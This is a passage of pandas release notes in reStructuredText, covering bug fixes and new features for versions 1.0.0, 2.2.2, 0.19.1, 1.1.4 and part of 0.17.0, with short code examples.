Fix :class:`AbstractHolidayCalendar` to return correct results for\n  years after 2030 (now goes up to 2200) (:issue:`27790`)\n- Fixed :class:`~arrays.IntegerArray` returning ``inf`` rather than ``NaN`` for operations dividing by ``0`` (:issue:`27398`)\n- Fixed ``pow`` operations for :class:`~arrays.IntegerArray` when the other value is ``0`` or ``1`` (:issue:`29997`)\n- Bug in :meth:`Series.count` raises if use_inf_as_na is enabled (:issue:`29478`)\n- Bug in :class:`Index` where a non-hashable name could be set without raising ``TypeError`` (:issue:`29069`)\n- Bug in :class:`DataFrame` constructor when passing a 2D ``ndarray`` and an extension dtype (:issue:`12513`)\n- Bug in :meth:`DataFrame.to_csv` when supplied a series with a ``dtype=\"string\"`` and a ``na_rep``, the ``na_rep`` was being truncated to 2 characters. (:issue:`29975`)\n- Bug where :meth:`DataFrame.itertuples` would incorrectly determine whether or not namedtuples could be used for dataframes of 255 columns (:issue:`28282`)\n- Handle nested NumPy ``object`` arrays in :func:`testing.assert_series_equal` for ExtensionArray implementations (:issue:`30841`)\n- Bug in :class:`Index` constructor incorrectly allowing 2-dimensional input arrays (:issue:`13601`, :issue:`27125`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_100.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.25.3..v1.0.0\n\n\n.. _whatsnew_222:\n\nWhat's new in 2.2.2 (April 10, 2024)\n---------------------------------------\n\nThese are the changes in pandas 2.2.2. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_220.np2_compat:\n\nPandas 2.2.2 is now compatible with numpy 2.0\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nPandas 2.2.2 is the first version of pandas that is generally compatible with the upcoming\nnumpy 2.0 release, and wheels for pandas 2.2.2 will work with both numpy 1.x and 2.x.\n\nOne major caveat is that arrays created with numpy 2.0's new ``StringDtype`` will convert\nto ``object`` dtyped arrays upon :class:`Series`/:class:`DataFrame` creation.\nFull support for numpy 2.0's StringDtype is expected to land in pandas 3.0.\n\nAs usual please report any bugs discovered to our `issue tracker <https://github.com/pandas-dev/pandas/issues/new/choose>`_\n\n.. _whatsnew_222.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- :meth:`DataFrame.__dataframe__` was producing incorrect data buffers when the a column's type was a pandas nullable on with missing values (:issue:`56702`)\n- :meth:`DataFrame.__dataframe__` was producing incorrect data buffers when the a column's type was a pyarrow nullable on with missing values (:issue:`57664`)\n- Avoid issuing a spurious ``DeprecationWarning`` when a custom :class:`DataFrame` or :class:`Series` subclass method is called (:issue:`57553`)\n- Fixed regression in precision of :func:`to_datetime` with string and ``unit`` input (:issue:`57051`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_222.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- :meth:`DataFrame.__dataframe__` was producing incorrect data buffers when the column's type was nullable boolean (:issue:`55332`)\n- :meth:`DataFrame.__dataframe__` was showing bytemask instead of bitmask for ``'string[pyarrow]'`` validity buffer (:issue:`57762`)\n- :meth:`DataFrame.__dataframe__` was showing non-null validity buffer (instead of ``None``) ``'string[pyarrow]'`` without missing values (:issue:`57761`)\n- :meth:`DataFrame.to_sql` was failing to find the right table when using the schema argument (:issue:`57539`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_222.other:\n\nOther\n~~~~~\n-\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_222.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v2.2.1..v2.2.2|HEAD\n\n\n.. _whatsnew_0191:\n\nVersion 0.19.1 (November 3, 2016)\n---------------------------------\n\n{{ header }}\n\n.. ipython:: python\n   :suppress:\n\n   from pandas import *   noqa F401, F403\n\n\nThis is a minor bug-fix release from 0.19.0 and includes some small regression fixes,\nbug fixes and performance improvements.\nWe recommend that all users upgrade to this version.\n\n.. contents:: What's new in v0.19.1\n    :local:\n    :backlinks: none\n\n\n.. _whatsnew_0191.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Fixed performance regression in factorization of ``Period`` data (:issue:`14338`)\n- Fixed performance regression in ``Series.asof(where)`` when ``where`` is a scalar (:issue:`14461`)\n- Improved performance in ``DataFrame.asof(where)`` when ``where`` is a scalar (:issue:`14461`)\n- Improved performance in ``.to_json()`` when ``lines=True`` (:issue:`14408`)\n- Improved performance in certain types of ``loc`` indexing with a MultiIndex (:issue:`14551`).\n\n\n.. _whatsnew_0191.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n- Source installs from PyPI will now again work without ``cython`` installed, as in previous versions (:issue:`14204`)\n- Compat with Cython 0.25 for building (:issue:`14496`)\n- Fixed regression where user-provided file handles were closed in ``read_csv`` (c engine) (:issue:`14418`).\n- Fixed regression in ``DataFrame.quantile`` when missing values where present in some columns (:issue:`14357`).\n- Fixed regression in ``Index.difference`` where the ``freq`` of a ``DatetimeIndex`` was incorrectly set (:issue:`14323`)\n- Added back ``pandas.core.common.array_equivalent`` with a deprecation warning (:issue:`14555`).\n- Bug in ``pd.read_csv`` for the C engine in which quotation marks were improperly parsed in skipped rows (:issue:`14459`)\n- Bug in ``pd.read_csv`` for Python 2.x in which Unicode quote characters were no longer being respected (:issue:`14477`)\n- Fixed regression in ``Index.append`` when categorical indices were appended (:issue:`14545`).\n- Fixed regression in ``pd.DataFrame`` where constructor fails when given dict with ``None`` value (:issue:`14381`)\n- Fixed regression in ``DatetimeIndex._maybe_cast_slice_bound`` when index is empty (:issue:`14354`).\n- Bug in localizing an ambiguous timezone when a boolean is passed (:issue:`14402`)\n- Bug in ``TimedeltaIndex`` addition with a Datetime-like object where addition overflow in the negative direction was not being caught (:issue:`14068`, :issue:`14453`)\n- Bug in string indexing against data with ``object`` ``Index`` may raise ``AttributeError`` (:issue:`14424`)\n- Correctly raise ``ValueError`` on empty input to ``pd.eval()`` and ``df.query()`` (:issue:`13139`)\n- Bug in ``RangeIndex.intersection`` when result is a empty set (:issue:`14364`).\n- Bug in groupby-transform broadcasting that could cause incorrect dtype coercion (:issue:`14457`)\n- Bug in ``Series.__setitem__`` which allowed mutating read-only arrays (:issue:`14359`).\n- Bug in ``DataFrame.insert`` where multiple calls with duplicate columns can fail (:issue:`14291`)\n- ``pd.merge()`` will raise ``ValueError`` with non-boolean parameters in passed boolean type arguments (:issue:`14434`)\n- Bug in ``Timestamp`` where dates very near the minimum (1677-09) could underflow on creation (:issue:`14415`)\n- Bug in ``pd.concat`` where names of the ``keys`` were not propagated to the resulting ``MultiIndex`` (:issue:`14252`)\n- Bug in ``pd.concat`` where ``axis`` cannot take string parameters ``'rows'`` or ``'columns'`` (:issue:`14369`)\n- Bug in ``pd.concat`` with dataframes heterogeneous in length and tuple ``keys`` (:issue:`14438`)\n- Bug in ``MultiIndex.set_levels`` where illegal level values were still set after raising an error (:issue:`13754`)\n- Bug in ``DataFrame.to_json`` where ``lines=True`` and a value contained a ``}`` character (:issue:`14391`)\n- Bug in ``df.groupby`` causing an ``AttributeError`` when grouping a single index frame by a column and the index level (:issue:`14327`)\n- Bug in ``df.groupby`` where ``TypeError`` raised when ``pd.Grouper(key=...)`` is passed in a list (:issue:`14334`)\n- Bug in ``pd.pivot_table`` may raise ``TypeError`` or ``ValueError`` when ``index`` or ``columns``\n  is not scalar and ``values`` is not specified (:issue:`14380`)\n\n\n.. _whatsnew_0.19.1.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v0.19.0..v0.19.1\n\n\n.. _whatsnew_114:\n\nWhat's new in 1.1.4 (October 30, 2020)\n--------------------------------------\n\nThese are the changes in pandas 1.1.4. See :ref:`release` for a full changelog\nincluding other versions of pandas.\n\n{{ header }}\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_114.regressions:\n\nFixed regressions\n~~~~~~~~~~~~~~~~~\n- Fixed regression in :func:`read_csv` raising a ``ValueError`` when ``names`` was of type ``dict_keys`` (:issue:`36928`)\n- Fixed regression in :func:`read_csv` with more than 1M rows and specifying a ``index_col`` argument (:issue:`37094`)\n- Fixed regression where attempting to mutate a :class:`DateOffset` object would no longer raise an ``AttributeError`` (:issue:`36940`)\n- Fixed regression where :meth:`DataFrame.agg` would fail with :exc:`TypeError` when passed positional arguments to be passed on to the aggregation function (:issue:`36948`).\n- Fixed regression in :class:`RollingGroupby` with ``sort=False`` not being respected (:issue:`36889`)\n- Fixed regression in :meth:`Series.astype` converting ``None`` to ``\"nan\"`` when casting to string (:issue:`36904`)\n- Fixed regression in :meth:`Series.rank` method failing for read-only data (:issue:`37290`)\n- Fixed regression in :class:`RollingGroupby` causing a segmentation fault with Index of dtype object (:issue:`36727`)\n- Fixed regression in :meth:`DataFrame.resample(...).apply(...)` raised ``AttributeError`` when input was a :class:`DataFrame` and only a :class:`Series` was evaluated (:issue:`36951`)\n- Fixed regression in ``DataFrame.groupby(..).std()`` with nullable integer dtype (:issue:`37415`)\n- Fixed regression in :class:`PeriodDtype` comparing both equal and unequal to its string representation (:issue:`37265`)\n- Fixed regression where slicing :class:`DatetimeIndex` raised :exc:`AssertionError` on irregular time series with ``pd.NaT`` or on unsorted indices (:issue:`36953` and :issue:`35509`)\n- Fixed regression in certain offsets (:meth:`pd.offsets.Day() <pandas.tseries.offsets.Day>` and below) no longer being hashable (:issue:`37267`)\n- Fixed regression in :class:`StataReader` which required ``chunksize`` to be manually set when using an iterator to read a dataset (:issue:`37280`)\n- Fixed regression in setitem with :meth:`DataFrame.iloc` which raised error when trying to set a value while filtering with a boolean list (:issue:`36741`)\n- Fixed regression in setitem with a Series getting aligned before setting the values (:issue:`37427`)\n- Fixed regression in :attr:`MultiIndex.is_monotonic_increasing` returning wrong results with ``NaN`` in at least one of the levels (:issue:`37220`)\n- Fixed regression in inplace arithmetic operation (`+=`) on a Series not updating the parent DataFrame/Series (:issue:`36373`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_114.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n- Bug causing ``groupby(...).sum()`` and similar to not preserve metadata (:issue:`29442`)\n- Bug in :meth:`Series.isin` and :meth:`DataFrame.isin` raising a ``ValueError`` when the target was read-only (:issue:`37174`)\n- Bug in :meth:`.DataFrameGroupBy.fillna` and :meth:`.SeriesGroupBy.fillna` that introduced a performance regression after 1.0.5 (:issue:`36757`)\n- Bug in :meth:`DataFrame.info` was raising a ``KeyError`` when the DataFrame has integer column names (:issue:`37245`)\n- Bug in :meth:`DataFrameGroupby.apply` would drop a :class:`CategoricalIndex` when grouped on (:issue:`35792`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_114.contributors:\n\nContributors\n~~~~~~~~~~~~\n\n.. contributors:: v1.1.3..v1.1.4\n\n\n.. _whatsnew_0170:\n\nVersion 0.17.0 (October 9, 2015)\n--------------------------------\n\n{{ header }}\n\n\nThis is a major release from 0.16.2 and includes a small number of API changes, several new features,\nenhancements, and performance improvements along with a large number of bug fixes. We recommend that all\nusers upgrade to this version.\n\n.. warning::\n\n   pandas >= 0.17.0 will no longer support compatibility with Python version 3.2 (:issue:`9118`)\n\n.. warning::\n\n   The ``pandas.io.data`` package is deprecated and will be replaced by the\n   `pandas-datareader package <https://github.com/pydata/pandas-datareader>`_.\n   This will allow the data modules to be independently updated to your pandas\n   installation. The API for ``pandas-datareader v0.1.1`` is exactly the same\n   as in ``pandas v0.17.0`` (:issue:`8961`, :issue:`10861`).\n\n   After installing pandas-datareader, you can easily change your imports:\n\n   .. code-block:: python\n\n     from pandas.io import data, wb\n\n   becomes\n\n   .. code-block:: python\n\n     from pandas_datareader import data, wb\n\nHighlights include:\n\n- Release the Global Interpreter Lock (GIL) on some cython operations, see :ref:`here <whatsnew_0170.gil>`\n- Plotting methods are now available as attributes of the ``.plot`` accessor, see :ref:`here <whatsnew_0170.plot>`\n- The sorting API has been revamped to remove some long-time inconsistencies, see :ref:`here <whatsnew_0170.api_breaking.sorting>`\n- Support for a ``datetime64[ns]`` with timezones as a first-class dtype, see :ref:`here <whatsnew_0170.tz>`\n- The default for ``to_datetime`` will now be to ``raise`` when presented with unparsable formats,\n  previously this would return the original input. Also, date parse\n  functions now return consistent results. See :ref:`here <whatsnew_0170.api_breaking.to_datetime>`\n- The default for ``dropna`` in ``HDFStore`` has changed to ``False``, to store by default all rows even\n  if they are all ``NaN``, see :ref:`here <whatsnew_0170.api_breaking.hdf_dropna>`\n- Datetime accessor (``dt``) now supports ``Series.dt.strftime`` to generate formatted strings for datetime-likes, and ``Series.dt.total_seconds`` to generate each duration of the timedelta in seconds. See :ref:`here <whatsnew_0170.strftime>`\n- ``Period`` and ``PeriodIndex`` can handle multiplied freq like ``3D``, which corresponding to 3 days span. See :ref:`here <whatsnew_0170.periodfreq>`\n- Development installed versions of pandas will now have ``PEP440`` compliant version strings (:issue:`9518`)\n- Development support for benchmarking with the `Air Speed Velocity library <https://github.com/spacetelescope/asv/>`_ (:issue:`8361`)\n- Support for reading SAS xport files, see :ref:`here <whatsnew_0170.enhancements.sas_xport>`\n- Documentation comparing SAS to *pandas*, see :ref:`here <compare_with_sas>`\n- Removal of the automatic TimeSeries broadcasting, deprecated since 0.8.0, see :ref:`here <whatsnew_0170.prior_deprecations>`\n- Display format with plain text can optionally align with Unicode East Asian Width, see :ref:`here <whatsnew_0170.east_asian_width>`\n- Compatibility with Python 3.5 (:issue:`11097`)\n- Compatibility with matplotlib 1.5.0 (:issue:`11111`)\n\nCheck the :ref:`API Changes <whatsnew_0170.api>` and :ref:`deprecations <whatsnew_0170.deprecations>` before updating.\n\n.. contents:: What's new in v0.17.0\n    :local:\n    :backlinks: none\n\n.. _whatsnew_0170.enhancements:\n\nNew features\n~~~~~~~~~~~~\n\n.. _whatsnew_0170.tz:\n\nDatetime with TZ\n^^^^^^^^^^^^^^^^\n\nWe are adding an implementation that natively supports datetime with timezones. A ``Series`` or a ``DataFrame`` column previously\n*could* be assigned a datetime with timezones, and would work as an ``object`` dtype. This had performance issues with a large\nnumber rows. See the :ref:`docs <timeseries.timezone_series>` for more details. (:issue:`8260`, :issue:`10763`, :issue:`11034`).\n\nThe new implementation allows for having a single-timezone across all rows, with operations in a performant manner.\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       {\n           \"A\": pd.date_range(\"20130101\", periods=3),\n           \"B\": pd.date_range(\"20130101\", periods=3, tz=\"US/Eastern\"),\n           \"C\": pd.date_range(\"20130101\", periods=3, tz=\"CET\"),\n       }\n   )\n   df\n   df.dtypes\n\n.. ipython:: python\n\n   df.B\n   df.B.dt.tz_localize(None)\n\nThis uses a new-dtype representation as well, that is very similar in look-and-feel to its numpy cousin ``datetime64[ns]``\n\n.. ipython:: python\n\n   df[\"B\"].dtype\n   type(df[\"B\"].dtype)\n\n.. note::\n\n   There is a slightly different string repr for the underlying ``DatetimeIndex`` as a result of the dtype changes, but\n   functionally these are the same.\n\n   Previous behavior:\n\n   .. code-block:: ipython\n\n      In [1]: pd.date_range('20130101', periods=3, tz='US/Eastern')\n      Out[1]: DatetimeIndex(['2013-01-01 00:00:00-05:00', '2013-01-02 00:00:00-05:00',\n                             '2013-01-03 00:00:00-05:00'],\n                            dtype='datetime64[ns]', freq='D', tz='US/Eastern')\n\n      In [2]: pd.date_range('20130101', periods=3, tz='US/Eastern').dtype\n      Out[2]: dtype('<M8[ns]')\n\n   New behavior:\n\n   .. ipython:: python\n\n      pd.date_range(\"20130101\", periods=3, tz=\"US/Eastern\")\n      pd.date_range(\"20130101\", periods=3, tz=\"US/Eastern\").dtype\n\n.. _whatsnew_0170.gil:\n\nReleasing the GIL\n^^^^^^^^^^^^^^^^^\n\nWe are releasing the global-interpreter-lock (GIL) on some cython operations.\nThis will allow other threads to run simultaneously during computation, potentially allowing performance improvements\nfrom multi-threading. Notably ``groupby``, ``nsmallest``, ``value_counts`` and some indexing operations benefit from this. (:issue:`8882`)\n\nFor example the groupby expression in the following code will have the GIL released during the factorization step, e.g. ``df.groupby('key')``\nas well as the ``.sum()`` operation.\n\n.. code-block:: python\n\n   N = 1000000\n   ngroups = 10\n   df = DataFrame(\n       {\"key\": np.random.randint(0, ngroups, size=N), \"data\": np.random.randn(N)}\n   )\n   df.groupby(\"key\")[\"data\"].sum()\n\nReleasing of the GIL could benefit an application that uses threads for user interactions (e.g. QT_), or performing multi-threaded computations. A nice example of a library that can handle these types of computation-in-parallel is the dask_ library.\n\n.. _dask: https://dask.readthedocs.io/en/latest/\n.. _QT: https://wiki.python.org/moin/PyQt\n\n.. _whatsnew_0170.plot:\n\nPlot submethods\n^^^^^^^^^^^^^^^\n\nThe Series and DataFrame ``.plot()`` method allows for customizing :ref:`plot types<visualization.other>` by supplying the ``kind`` keyword arguments. Unfortunately, many of these kinds of plots use different required and optional keyword arguments, which makes it difficult to discover what any given plot kind uses out of the dozens of possible arguments.\n\nTo alleviate this issue, we have added a new, optional plotting interface, which exposes each kind of plot as a method of the ``.plot`` attribute. Instead of writing ``series.plot(kind=<kind>, ...)``, you can now also use ``series.plot.<kind>(...)``:\n\n.. ipython::\n    :verbatim:\n\n    In [13]: df = pd.DataFrame(np.random.rand(10, 2), columns=['a', 'b'])\n\n    In [14]: df.plot.bar()\n\n.. image:: ../_static/whatsnew_plot_submethods.png\n\nAs a result of this change, these methods are now all discoverable via tab-completion:\n\n.. ipython::\n    :verbatim:\n\n    In [15]: df.plot.<TAB>   noqa: E225, E999\n    df.plot.area     df.plot.barh     df.plot.density  df.plot.hist     df.plot.line     df.plot.scatter\n    df.plot.bar      df.plot.box      df.plot.hexbin   df.plot.kde      df.plot.pie\n\nEach method signature only includes relevant arguments. Currently, these are limited to required arguments, but in the future these will include optional arguments, as well. For an overview, see the new :ref:`api.dataframe.plotting` API documentation.\n\n.. _whatsnew_0170.strftime:\n\nAdditional methods for ``dt`` accessor\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSeries.dt.strftime\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\nWe are now supporting a ``Series.dt.strftime`` method for datetime-likes to generate a formatted string (:issue:`10110`). Examples:\n\n.. ipython:: python\n\n    DatetimeIndex\n   s = pd.Series(pd.date_range(\"20130101\", periods=4))\n   s\n   s.dt.strftime(\"%Y/%m/%d\")\n\n.. ipython:: python\n\n    PeriodIndex\n   s = pd.Series(pd.period_range(\"20130101\", periods=4))\n   s\n   s.dt.strftime(\"%Y/%m/%d\")\n\nThe string format is as the python standard library and details can be found `here <https://docs.python.org/2/library/datetime.html#strftime-and-strptime-behavior>`_\n\nSeries.dt.total_seconds\n\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\n\n``pd.Series`` of type ``timedelta64`` has new method ``.dt.total_seconds()`` returning the duration of the timedelta in seconds (:issue:`10817`)\n\n.. ipython:: python\n\n    TimedeltaIndex\n   s = pd.Series(pd.timedelta_range(\"1 minutes\", periods=4))\n   s\n   s.dt.total_seconds()\n\n.. _whatsnew_0170.periodfreq:\n\nPeriod frequency enhancement\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n``Period``, ``PeriodIndex`` and ``period_range`` can now accept multiplied freq. Also, ``Period.freq`` and ``PeriodIndex.freq`` are now stored as a ``DateOffset`` instance like ``DatetimeIndex``, and not as ``str`` (:issue:`7811`)\n\nA multiplied freq represents a span of corresponding length. The example below creates a period of 3 days. Addition and subtraction will shift the period by its span.\n\n.. ipython:: python\n\n   p = pd.Period(\"2015-08-01\", freq=\"3D\")\n   p\n   p + 1\n   p - 2\n   p.to_timestamp()\n   p.to_timestamp(how=\"E\")\n\nYou can use the multiplied freq in ``PeriodIndex`` and ``period_range``.\n\n.. ipython:: python\n\n   idx = pd.period_range(\"2015-08-01\", periods=4, freq=\"2D\")\n   idx\n   idx + 1\n\n.. _whatsnew_0170.enhancements.sas_xport:\n\nSupport for SAS XPORT files\n^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`~pandas.io.read_sas` provides support for reading *SAS XPORT* format files. (:issue:`4052`).\n\n.. code-block:: python\n\n    df = pd.read_sas(\"sas_xport.xpt\")\n\nIt is also possible to obtain an iterator and read an XPORT file\nincrementally.\n\n.. code-block:: python\n\n    for df in pd.read_sas(\"sas_xport.xpt\", chunksize=10000):\n        do_something(df)\n\nSee the :ref:`docs <io.sas>` for more details.\n\n.. _whatsnew_0170.matheval:\n\nSupport for math functions in .eval()\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`~pandas.eval` now supports calling math functions (:issue:`4893`)\n\n.. code-block:: python\n\n    df = pd.DataFrame({\"a\": np.random.randn(10)})\n    df.eval(\"b = sin(a)\")\n\nThe support math functions are ``sin``, ``cos``, ``exp``, ``log``, ``expm1``, ``log1p``,\n``sqrt``, ``sinh``, ``cosh``, ``tanh``, ``arcsin``, ``arccos``, ``arctan``, ``arccosh``,\n``arcsinh``, ``arctanh``, ``abs`` and ``arctan2``.\n\nThese functions map to the intrinsics for the ``NumExpr`` engine.  For the Python\nengine, they are mapped to ``NumPy`` calls.\n\nChanges to Excel with ``MultiIndex``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nIn version 0.16.2 a ``DataFrame`` with ``MultiIndex`` columns could not be written to Excel via ``to_excel``.\nThat functionality has been added (:issue:`10564`), along with updating  ``read_excel`` so that the data can\nbe read back with, no loss of information, by specifying which columns/rows make up the ``MultiIndex``\nin the ``header`` and ``index_col`` parameters (:issue:`4679`)\n\nSee the :ref:`documentation <io.excel>` for more details.\n\n.. ipython:: python\n\n   df = pd.DataFrame(\n       [[1, 2, 3, 4], [5, 6, 7, 8]],\n       columns=pd.MultiIndex.from_product(\n           [[\"foo\", \"bar\"], [\"a\", \"b\"]], names=[\"col1\", \"col2\"]\n       ),\n       index=pd.MultiIndex.from_product([[\"j\"], [\"l\", \"k\"]], names=[\"i1\", \"i2\"]),\n   )\n\n   df\n   df.to_excel(\"test.xlsx\")\n\n   df = pd.read_excel(\"test.xlsx\", header=[0, 1], index_col=[0, 1])\n   df\n\n.. ipython:: python\n   :suppress:\n\n   import os\n\n   os.remove(\"test.xlsx\")\n\nPreviously, it was necessary to specify the ``has_index_names`` argument in ``read_excel``,\nif the serialized data had index names.  For version 0.17.0 the output format of ``to_excel``\nhas been changed to make this keyword unnecessary - the change is shown below.\n\n**Old**\n\n.. image:: ../_static/old-excel-index.png\n\n**New**\n\n.. image:: ../_static/new-excel-index.png\n\n.. warning::\n\n   Excel files saved in version 0.16.2 or prior that had index names will still able to be read in,\n   but the ``has_index_names`` argument must specified to ``True``.\n\n.. _whatsnew_0170.gbq:\n\nGoogle BigQuery enhancements\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n- Added ability to automatically create a table/dataset using the :func:`pandas.io.gbq.to_gbq` function if the destination table/dataset does not exist. (:issue:`8325`, :issue:`11121`).\n- Added ability to replace an existing table and schema when calling the :func:`pandas.io.gbq.to_gbq` function via the ``if_exists`` argument. See the `docs <https://pandas-gbq.readthedocs.io/en/latest/writing.html>`__ for more details (:issue:`8325`).\n- ``InvalidColumnOrder`` and ``InvalidPageToken`` in the gbq module will raise ``ValueError`` instead of ``IOError``.\n- The ``generate_bq_schema()`` function is now deprecated and will be removed in a future version (:issue:`11121`)\n- The gbq module will now support Python 3 (:issue:`11094`).\n\n.. _whatsnew_0170.east_asian_width:\n\nDisplay alignment with Unicode East Asian width\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. warning::\n\n   Enabling this option will affect the performance for printing of ``DataFrame`` and ``Series`` (about 2 times slower).\n   Use only when it is actually required.\n\nSome East Asian countries use Unicode characters its width is corresponding to 2 alphabets. If a ``DataFrame`` or ``Series`` contains these characters, the default output cannot be aligned properly. The following options are added to enable precise handling for these characters.\n\n- ``display.unicode.east_asian_width``: Whether to use the Unicode East Asian Width to calculate the display text width. (:issue:`2612`)\n- ``display.unicode.ambiguous_as_wide``: Whether to handle Unicode characters belong to Ambiguous as Wide. (:issue:`11102`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({u\"\u00e5\u009b\u00bd\u00e7\u00b1\u008d\": [\"UK\", u\"\u00e6\u0097\u00a5\u00e6\u009c\u00ac\"], u\"\u00e5\u0090\u008d\u00e5\u0089\u008d\": [\"Alice\", u\"\u00e3\u0081\u0097\u00e3\u0081\u00ae\u00e3\u0081\u00b6\"]})\n   df\n\n.. ipython:: python\n\n   pd.set_option(\"display.unicode.east_asian_width\", True)\n   df\n\nFor further details, see :ref:`here <options.east_asian_width>`\n\n.. ipython:: python\n   :suppress:\n\n   pd.set_option(\"display.unicode.east_asian_width\", False)\n\n.. _whatsnew_0170.enhancements.other:\n\nOther enhancements\n^^^^^^^^^^^^^^^^^^\n\n- Support for ``openpyxl`` >= 2.2. The API for style support is now stable (:issue:`10125`)\n- ``merge`` now accepts the argument ``indicator`` which adds a Categorical-type column (by default called ``_merge``) to the output object that takes on the values (:issue:`8790`)\n\n  ===================================   ================\n  Observation Origin                    ``_merge`` value\n  ===================================   ================\n  Merge key only in ``'left'`` frame    ``left_only``\n  Merge key only in ``'right'`` frame   ``right_only``\n  Merge key in both frames              ``both``\n  ===================================   ================\n\n  .. ipython:: python\n\n    df1 = pd.DataFrame({\"col1\": [0, 1], \"col_left\": [\"a\", \"b\"]})\n    df2 = pd.DataFrame({\"col1\": [1, 2, 2], \"col_right\": [2, 2, 2]})\n    pd.merge(df1, df2, on=\"col1\", how=\"outer\", indicator=True)\n\n  For more, see the :ref:`updated docs <merging.indicator>`\n\n- ``pd.to_numeric`` is a new function to coerce strings to numbers (possibly with coercion) (:issue:`11133`)\n\n- ``pd.merge`` will now allow duplicate column names if they are not merged upon (:issue:`10639`).\n\n- ``pd.pivot`` will now allow passing index as ``None`` (:issue:`3962`).\n\n- ``pd.concat`` will now use existing Series names if provided (:issue:`10698`).\n\n  .. ipython:: python\n\n     foo = pd.Series([1, 2], name=\"foo\")\n     bar = pd.Series([1, 2])\n     baz = pd.Series([4, 5])\n\n  Previous behavior:\n\n  .. code-block:: ipython\n\n     In [1]: pd.concat([foo, bar, baz], axis=1)\n     Out[1]:\n           0  1  2\n        0  1  1  4\n        1  2  2  5\n\n  New behavior:\n\n  .. ipython:: python\n\n    pd.concat([foo, bar, baz], axis=1)\n\n- ``DataFrame`` has gained the ``nlargest`` and ``nsmallest`` methods (:issue:`10393`)\n\n- Add a ``limit_direction`` keyword argument that works with ``limit`` to enable ``interpolate`` to fill ``NaN`` values forward, backward, or both (:issue:`9218`, :issue:`10420`, :issue:`11115`)\n\n  .. ipython:: python\n\n     ser = pd.Series([np.nan, np.nan, 5, np.nan, np.nan, np.nan, 13])\n     ser.interpolate(limit=1, limit_direction=\"both\")\n\n- Added a ``DataFrame.round`` method to round the values to a variable number of decimal places (:issue:`10568`).\n\n  .. ipython:: python\n\n     df = pd.DataFrame(\n         np.random.random([3, 3]),\n         columns=[\"A\", \"B\", \"C\"],\n         index=[\"first\", \"second\", \"third\"],\n     )\n     df\n     df.round(2)\n     df.round({\"A\": 0, \"C\": 2})\n\n- ``drop_duplicates`` and ``duplicated`` now accept a ``keep`` keyword to target first, last, and all duplicates. The ``take_last`` keyword is deprecated, see :ref:`here <whatsnew_0170.deprecations>` (:issue:`6511`, :issue:`8505`)\n\n  .. ipython:: python\n\n     s = pd.Series([\"A\", \"B\", \"C\", \"A\", \"B\", \"D\"])\n     s.drop_duplicates()\n     s.drop_duplicates(keep=\"last\")\n     s.drop_duplicates(keep=False)\n\n- Reindex now has a ``tolerance`` argument that allows for finer control of :ref:`basics.limits_on_reindex_fill` (:issue:`10411`):\n\n  .. ipython:: python\n\n     df = pd.DataFrame({\"x\": range(5), \"t\": pd.date_range(\"2000-01-01\", periods=5)})\n     df.reindex([0.1, 1.9, 3.5], method=\"nearest\", tolerance=0.2)\n\n  When used on a ``DatetimeIndex``, ``TimedeltaIndex`` or ``PeriodIndex``, ``tolerance`` will coerced into a ``Timedelta`` if possible. This allows you to specify tolerance with a string:\n\n  .. ipython:: python\n\n     df = df.set_index(\"t\")\n     df.reindex(pd.to_datetime([\"1999-12-31\"]), method=\"nearest\", tolerance=\"1 day\")\n\n  ``tolerance`` is also exposed by the lower level ``Index.get_indexer`` and ``Index.get_loc`` methods.\n\n- Added functionality to use the ``base`` argument when resampling a ``TimeDeltaIndex`` (:issue:`10530`)\n\n- ``DatetimeIndex`` can be instantiated using strings contains ``NaT`` (:issue:`7599`)\n\n- ``to_datetime`` can now accept the ``yearfirst`` keyword (:issue:`7599`)\n\n- ``pandas.tseries.offsets`` larger than the ``Day`` offset can now be used with a ``Series`` for addition/subtraction (:issue:`10699`).  See the :ref:`docs <timeseries.offsetseries>` for more details.\n\n- ``pd.Timedelta.total_seconds()`` now returns Timedelta duration to ns precision (previously microsecond precision) (:issue:`10939`)\n\n- ``PeriodIndex`` now supports arithmetic with ``np.ndarray`` (:issue:`10638`)\n\n- Support pickling of ``Period`` objects (:issue:`10439`)\n\n- ``.as_blocks`` will now take a ``copy`` optional argument to return a copy of the data, default is to copy (no change in behavior from prior versions), (:issue:`9607`)\n\n- ``regex`` argument to ``DataFrame.filter`` now handles numeric column names instead of raising ``ValueError`` (:issue:`10384`).\n\n- Enable reading gzip compressed files via URL, either by explicitly setting the compression parameter or by inferring from the presence of the HTTP Content-Encoding header in the response (:issue:`8685`)\n\n- Enable writing Excel files in :ref:`memory <io.excel_writing_buffer>` using StringIO/BytesIO (:issue:`7074`)\n\n- Enable serialization of lists and dicts to strings in 